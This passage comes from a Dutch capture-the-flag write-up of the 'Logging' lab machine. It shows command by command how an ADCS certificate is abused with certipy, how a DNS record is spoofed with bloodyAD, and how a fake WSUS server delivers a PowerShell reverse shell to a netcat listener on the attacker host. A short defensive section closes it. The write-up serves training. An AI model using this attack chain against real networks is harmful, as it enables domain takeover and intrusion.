reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU
UseWUServer    REG_DWORD    0x1
```

**Stap 2** is het vinden van de kwetsbare template: we weten al van Locksmith dat het `UpdateSrv` is, en we kennen ook de CA-naam.

Dus gaan we naar **stap 3**.

```bash
certipy-ad req -u jaylee.clifton -k -no-pass -ca logging-DC01-CA -target dc01.logging.htb -dc-host dc01.logging.htb -dns wsus.logging.htb -template UpdateSrv -debug
```

```bash
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

**Stap 4**: het wsus-verkeer onderscheppen. De gebruiker `jaylee.clifton` kan een record aanmaken in `MicrosoftDNS`.

```bash
bloodyAD -k ccache='ticket.ccache' -d logging.htb --dc-ip 10.129.45.103 --host dc01.logging.htb get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=jaylee.clifton,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

Het bloodyAD-commando hieronder laat zien dat `wsus.logging.htb` nog niet bestaat.

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u jaylee.clifton --dc-ip 10.129.45.103 -k get children --target "DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb"
```

Dus maken we er een aan ;)

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u jaylee.clifton --dc-ip 10.129.45.103 -k add dnsRecord wsus.logging.htb <ATTACKER_IP>
[+] wsus.logging.htb has been successfully added
```

Dan gaan we naar revshells om een reverse shell te maken.

[revshells.com](https://www.revshells.com/)

Meestal kies ik de PowerShell Base64-gecodeerde payload.

![Reverse shell-generator (revshells.com) - PowerShell Base64-payload](/assets/img/writeups/logging/revshell_generator.png)

Start eerst weer een netcat-listener.

```bash
rlwrap nc -nlvp 9911
```

Dan de wsus-server.

```bash
sudo wsuks --serve-only --tls-cert wsus.pem -I tun0 -c "powershell -e <REDACTED>"
```

En dan even wachten. Je ziet een verzoek voorbijkomen in de log.

```text
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on <ATTACKER_IP>:8531...
[*] Serving executable as KB: 8625440
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
[+] Received POST request: /ClientWebService?...
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"
```

We hebben een verbinding.

```bash
rlwrap nc -nlvp 9911
Listening on 0.0.0.0 9911
Connection received on 10.129.45.103 56917
```

Waar is root.txt? Mis ik iets?

```powershell
PS C:\Users\Administrator\Desktop> whoami
logging\administrator
PS C:\Users\Administrator\Desktop> dir /a

Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        4/16/2026   8:24 AM            282 desktop.ini
```

![BloodHound - TOBY.BRYNLEIGH is lid van Domain Admins](/assets/img/writeups/logging/bloodhound_toby.png)

Toby is ook domeinadmin. Inloggen met het ingebouwde administrator-account is natuurlijk slechte praktijk.

```powershell
PS C:\Users\toby.brynleigh\Desktop> dir

Directory: C:\Users\toby.brynleigh\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/6/2026   7:04 PM             34 root.txt
```

## Verdedigend perspectief

Vanuit verdedigend perspectief zou ik met logs en monitoring controleren waar servers naartoe proberen te verbinden. Zijn dat servers die niet bestaan, dan is er een kans dat ze gespoofd worden. Gebruikers moeten rechten krijgen volgens least privilege; DNS-records aanmaken is niet iets wat iedereen nodig heeft. Het jaar ophogen in wachtwoorden is ook slechte praktijk. Logbestanden verraden veel; ze zijn nuttig voor debugging en monitoring, maar aanvallers vinden ze ook handig.

## Lessen

Ga er niet van uit dat de tools die je al kent nog werken. Er verschijnen elke dag nieuwe kwetsbaarheden en nieuwe exploitatietechnieken, dus houd de omgeving gepatcht.
